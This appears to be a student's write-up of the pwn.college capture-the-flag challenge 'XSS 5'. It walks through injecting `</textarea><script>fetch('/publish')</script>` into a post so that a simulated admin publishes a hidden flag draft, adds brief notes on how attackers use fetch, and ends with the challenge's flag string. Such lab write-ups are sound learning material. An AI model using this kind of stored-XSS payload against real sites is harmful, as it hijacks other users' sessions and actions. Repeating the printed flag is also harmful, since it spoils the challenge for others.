@@ -1,0 +1,40 @@
+# challenge: XSS 5
+
+📅 2026-02-28
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+2 databases: 
+posts -> 3 columns: content-author-published 
+only one record -> [flag]-admin-FALSE
+users -> 2 columns: username-password
+3 records: admin-[flag], hacker-1337, guest-password
+4 endpoints: 
+/login -> POST - takes username and password as fields
+/draft -> POST - username-session based. it means the username has to exists in the database. it has only one field: content
+/publish -> GET - username-session based. a request to this endpoint will publish every user drafts
+/ -> root. shows every users post. for draft post shows the first 12chars.
+the goal is to trick the admin into make him publish the draft flag
+-ran: '/challenge/server'
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as hacker-1337
+-typed in post field: </textarea><script>fetch('/publish')</script>
+-tick on publish and saved it
+-opened a new terminal
+-ran: '/challenge/victim http://challenge.localhost:80/'
+-went back to the browser and reloaded the page
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+basically for learning pourpose only, xss is teached with alert but real attackers never use it
+most of the time they use javascript fetch function which allows to send a new request to an endpoint usually owned by the attacker in its server
+fetch's syntax is the following: fetch('[/endpoint]') for GET request
+
+## 🏁 Flag  
+pwn.college{8f4OaHm7-P2G8qyoU0VVVVDL8mW.QX2kzMzwCO4IDOxEzW}
